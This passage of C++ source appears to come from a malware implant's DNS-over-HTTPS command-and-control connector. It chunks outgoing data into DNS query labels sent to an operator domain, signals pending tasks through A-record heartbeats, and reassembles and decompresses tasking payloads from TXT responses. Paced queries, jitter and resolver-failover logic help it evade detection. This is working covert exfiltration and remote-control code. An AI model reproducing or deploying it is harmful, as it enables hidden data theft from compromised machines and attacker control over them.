		const ULONG maxUploadSize = 4u << 20; // 4MB
		if (total > maxUploadSize)
			total = maxUploadSize;

		ULONG seqForSend = ++this->seq;
		ULONG offset = 0;
		while (offset < total) {
			ULONG chunk = total - offset;
			if (chunk > maxChunk)
				chunk = maxChunk;

			ULONG frameSize = headerSize + chunk;
			BYTE* frame = (BYTE*)MemAllocLocal(frameSize);
			if (!frame)
				return;

			// total_len (big-endian)
			frame[0] = (BYTE)((total >> 24) & 0xFF);
			frame[1] = (BYTE)((total >> 16) & 0xFF);
			frame[2] = (BYTE)((total >> 8) & 0xFF);
			frame[3] = (BYTE)((total >> 0) & 0xFF);
			// offset (big-endian)
			frame[4] = (BYTE)((offset >> 24) & 0xFF);
			frame[5] = (BYTE)((offset >> 16) & 0xFF);
			frame[6] = (BYTE)((offset >> 8) & 0xFF);
			frame[7] = (BYTE)((offset >> 0) & 0xFF);
			memcpy(frame + headerSize, data + offset, chunk);

			memset(dataLabel, 0, sizeof(dataLabel));
			if (!DnsBuildDataLabels(frame, frameSize, this->labelSize, dataLabel, sizeof(dataLabel))) {
				MemFreeLocal((LPVOID*)&frame, frameSize);
				return;
			}
			MemFreeLocal((LPVOID*)&frame, frameSize);

			DnsBuildQName(this->sid, "cdn", seqForSend, this->idx, dataLabel, this->domain, qname, sizeof(qname));
			BYTE tmp[512];
			ULONG tmpSize = 0;
			DohQueryTxt(qname, tmp, sizeof(tmp), &tmpSize);

			// Pacing: similar to DNS transport, keep QPS in a safe range.
			ULONG pacing = 25 + (GetTickCount() % 15);
			ApiWin->Sleep(pacing);

			offset += chunk;
		}
		this->lastUpTotal = total;
		return;
	}

	// -------------------------------------------------------------------------
	// 3. HI retry path when no explicit data is provided
	// -------------------------------------------------------------------------
	if (!this->hiSent && this->hiBeat && this->hiBeatSize && this->hiRetries > 0) {
		// Backoff: only attempt HI retry when the scheduled time has passed
		if (this->hiRetryDelayMs && this->hiNextAttemptTick) {
			ULONG now = GetTickCount();
			if (now < this->hiNextAttemptTick) {
				return;
			}
		}

		ULONG maxBuf = pkt;
		ULONG retrySize = this->hiBeatSize;
		if (retrySize > maxBuf)
			retrySize = maxBuf;
		BYTE* encBuf = (BYTE*)MemAllocLocal(retrySize);
		if (!encBuf)
			return;
		memcpy(encBuf, this->hiBeat, retrySize);
		memset(dataLabel, 0, sizeof(dataLabel));
		if (!DnsBuildDataLabels(encBuf, retrySize, this->labelSize, dataLabel, sizeof(dataLabel))) {
			MemFreeLocal((LPVOID*)&encBuf, retrySize);
			return;
		}
		MemFreeLocal((LPVOID*)&encBuf, retrySize);

		DnsBuildQName(this->sid, "www", this->seq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
		BYTE tmp[512];
		ULONG tmpSize = 0;
		if (DohQueryTxt(qname, tmp, sizeof(tmp), &tmpSize)) {
			this->hiSent = TRUE;
			this->hiRetryDelayMs = 0;
			this->hiNextAttemptTick = 0;
		}
		else if (this->hiRetries > 0) {
			this->hiRetries--;
			if (this->hiRetries > 0) {
				if (this->hiRetryDelayMs == 0) {
					this->hiRetryDelayMs = 1000; // start with 1s
				}
				else {
					ULONG next = this->hiRetryDelayMs * 2;
					if (next > 300000) // cap at 5 minutes
						next = 300000;
					this->hiRetryDelayMs = next;
				}
				this->hiNextAttemptTick = GetTickCount() + this->hiRetryDelayMs;
			}
		}
		return;
	}

	// -------------------------------------------------------------------------
	// 4. Normal GET: heartbeat + downlink pull.
	// -------------------------------------------------------------------------
	// Heartbeat A-query when there is no in-progress downlink buffer. This
	// mirrors ConnectorDNS::SendData hybrid A/TXT behavior:
	//  - A(0.0.0.0) -> no tasks, return and let AgentMain sleep
	//  - A(0.0.0.1) -> has tasks, fall through to TXT GET below
	// ACK mechanism: encode downAckOffset in dataLabel to tell server which offset is confirmed.
	if (!this->downBuf) {
		CHAR qnameA[512];
		// 编码 ACK offset 到 dataLabel：4字节 big-endian base32 编码
		BYTE ackBytes[4];
		ackBytes[0] = (BYTE)((this->downAckOffset >> 24) & 0xFF);
		ackBytes[1] = (BYTE)((this->downAckOffset >> 16) & 0xFF);
		ackBytes[2] = (BYTE)((this->downAckOffset >> 8) & 0xFF);
		ackBytes[3] = (BYTE)((this->downAckOffset >> 0) & 0xFF);
		CHAR ackLabel[16];
		memset(ackLabel, 0, sizeof(ackLabel));
		DnsBase32Encode(ackBytes, 4, ackLabel, sizeof(ackLabel));
		DnsBuildQName(this->sid, "api", this->seq + 1, this->idx, ackLabel, this->domain, qnameA, sizeof(qnameA));
		DnsDebugLogf("[DoH] HEARTBEAT(A): seq=%lu ack_offset=%lu", this->seq + 1, this->downAckOffset);
		BYTE ipBuf[16];
		ULONG ipSize = 0;
		if (DohQueryA(qnameA, ipBuf, sizeof(ipBuf), &ipSize) && ipSize >= 4) {
			if (ipBuf[0] == 0 && ipBuf[1] == 0 && ipBuf[2] == 0 && ipBuf[3] == 0) {
				DnsDebugLog("[DoH] HEARTBEAT: no tasks (0.0.0.0)");
				// No tasks: advance seq and return immediately.
				this->seq++;
				// 重置 ACK offset 因为没有待下载的任务
				this->downAckOffset = 0;
				return;
			}
			DnsDebugLogf("[DoH] HEARTBEAT: has tasks (IP=%u.%u.%u.%u)", 
			             ipBuf[0], ipBuf[1], ipBuf[2], ipBuf[3]);
		} else {
			// A-record heartbeat failed; skip TXT this round and retry later.
			DnsDebugLog("[DoH] HEARTBEAT: A query FAILED");
			return;
		}
	}

	DnsBuildQName(this->sid, "api", ++this->seq, this->idx, "", this->domain, qname, sizeof(qname));
	// Larger buffers to safely hold big Base64-encoded TXT responses for multi-fragment
	// downlink frames (e.g. 856-byte binary frames + 8-byte header -> ~1.2KB Base64).
	BYTE respBuf[4096];
	ULONG respSize = 0;
	if (DohQueryTxt(qname, respBuf, sizeof(respBuf), &respSize) && respSize > 0) {
		// Simple ACK path
		if (respSize == 2 && respBuf[0] == 'O' && respBuf[1] == 'K') {
			return;
		}

		// Base64 decode the TXT response into binary chunk
		BYTE binBuf[4096];
		int binLen = DnsBase64Decode((const CHAR*)respBuf, (int)respSize, binBuf, (int)sizeof(binBuf));
		if (binLen <= 0) {
			DohConnectorLog("[DoH] Down: DnsBase64Decode failed or empty");
			return; // invalid or empty payload
		}

		const ULONG headerSize = 8;
		// New protocol: [total_len][offset] header in big-endian
		if (binLen > (int)headerSize) {
			ULONG total = 0;
			ULONG offset = 0;
			total |= ((ULONG)binBuf[0] << 24);
			total |= ((ULONG)binBuf[1] << 16);
			total |= ((ULONG)binBuf[2] << 8);
			total |= ((ULONG)binBuf[3] << 0);
			offset |= ((ULONG)binBuf[4] << 24);
			offset |= ((ULONG)binBuf[5] << 16);
			offset |= ((ULONG)binBuf[6] << 8);
			offset |= ((ULONG)binBuf[7] << 0);
			ULONG chunkLen = (ULONG)(binLen - (int)headerSize);
			const ULONG maxDownloadSize = 4u << 20; // 4MB
			if (total > 0 && total <= maxDownloadSize && offset < total) {
				CHAR dbg[160];
				_snprintf(dbg, sizeof(dbg),
					"[DoH] Down: total=%lu offset=%lu chunkLen=%lu downFilled=%lu downTotal=%lu",
					(unsigned long)total,
					(unsigned long)offset,
					(unsigned long)chunkLen,
					(unsigned long)this->downFilled,
					(unsigned long)this->downTotal);
				DohConnectorLog(dbg);
				if (!this->downBuf || this->downTotal != total) {
					if (this->downBuf && this->downTotal) {
						MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
					}
					this->downBuf = (BYTE*)MemAllocLocal(total);
					if (!this->downBuf) {
						this->downTotal = 0;
						this->downFilled = 0;
						return;
					}
					this->downTotal = total;
					this->downFilled = 0;
				}

				// If we receive offset 0 but already have some data, reset buffer
				if (offset == 0 && this->downFilled > 0) {
					DohConnectorLog("[DoH] Down: offset==0 with existing data, resetting buffer");
					if (this->downBuf && this->downTotal) {
						MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
					}
					this->downBuf = (BYTE*)MemAllocLocal(total);
					if (!this->downBuf) {
						this->downTotal = 0;
						this->downFilled = 0;
						return;
					}
					this->downTotal = total;
					this->downFilled = 0;
				}

				ULONG end = offset + chunkLen;
				if (end > total)
					end = total;
				ULONG n = end - offset;
				memcpy(this->downBuf + offset, binBuf + headerSize, n);
				this->downFilled += n;
				// 更新 ACK offset - 记录已接收的最大连续 offset
				this->downAckOffset = this->downFilled;
				DnsDebugLogf("[DoH] GET: reassembly progress %lu/%lu (%.1f%%)", 
				             this->downFilled, this->downTotal, 
				             (float)this->downFilled * 100.0f / (float)this->downTotal);
				if (this->downFilled >= this->downTotal) {
					// Session header: [flags][orig_len_le], followed by payload
					BYTE* finalBuf = this->downBuf;
					ULONG finalSize = this->downTotal;
					if (this->downTotal > 5) {
						BYTE flags = this->downBuf[0];
						ULONG orig = 0;
						orig |= (ULONG)this->downBuf[1];
						orig |= ((ULONG)this->downBuf[2] << 8);
						orig |= ((ULONG)this->downBuf[3] << 16);
						orig |= ((ULONG)this->downBuf[4] << 24);

						if ((flags & 0x1) && orig > 0 && orig <= (4u << 20)) {
							BYTE* outBuf = NULL;
							if (DeflateDecompress(this->downBuf + 5, this->downTotal - 5, &outBuf, orig) && outBuf) {
								finalBuf = outBuf;
								finalSize = orig;
								MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
								this->downBuf = NULL;
							}
							else {
								MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
								this->downBuf = NULL;
								this->downTotal = 0;
								this->downFilled = 0;
								return;
							}
						}
						else if (flags == 0 && orig > 0 && orig <= this->downTotal - 5) {
							BYTE* outBuf = (BYTE*)MemAllocLocal(orig);
							if (outBuf) {
								memcpy(outBuf, this->downBuf + 5, orig);
								finalBuf = outBuf;
								finalSize = orig;
								MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
								this->downBuf = NULL;
							}
							else {
								MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
								this->downBuf = NULL;
								this->downTotal = 0;
								this->downFilled = 0;
								return;
							}
						}
					}

					this->recvData = finalBuf;
					this->recvSize = (int)finalSize;
					this->lastDownTotal = finalSize;
					this->downBuf = NULL;
					this->downTotal = 0;
					this->downFilled = 0;
					// 重置 ACK offset，任务下载完成
					this->downAckOffset = 0;
					DnsDebugLogf("[DoH] GET: task ready, size=%lu bytes", finalSize);
				}
				return;
			}
		}

		// Legacy path: no header, treat as single complete buffer
		this->recvData = (BYTE*)MemAllocLocal(binLen);
		if (!this->recvData)
			return;
		memcpy(this->recvData, binBuf, binLen);
		this->recvSize = binLen;
		this->lastDownTotal = (ULONG)binLen;
	}
}

BYTE* ConnectorDoH::RecvData() { return this->recvData; }
int ConnectorDoH::RecvSize() { return this->recvSize; }
void ConnectorDoH::RecvClear() { this->recvData = NULL; this->recvSize = 0; }

void ConnectorDoH::ReportProtocolResult(BOOL success)
{
	if (this->urlCount == 0)
		return;
	ULONG idx = this->currentUrlIndex;
	if (idx >= this->urlCount)
		idx = 0;
	if (success) {
		this->urlFailCount[idx] = 0;
		this->urlDisabledUntil[idx] = 0;
		return;
	}
	this->urlFailCount[idx]++;
	const ULONG max_fail = 3;
	if (this->urlFailCount[idx] >= max_fail) {
		ULONG backoff = 60000;
		ULONG jitter = GetTickCount() & 0x1FFF;
		this->urlDisabledUntil[idx] = GetTickCount() + backoff + jitter;
		this->urlFailCount[idx] = 0;
	}
}
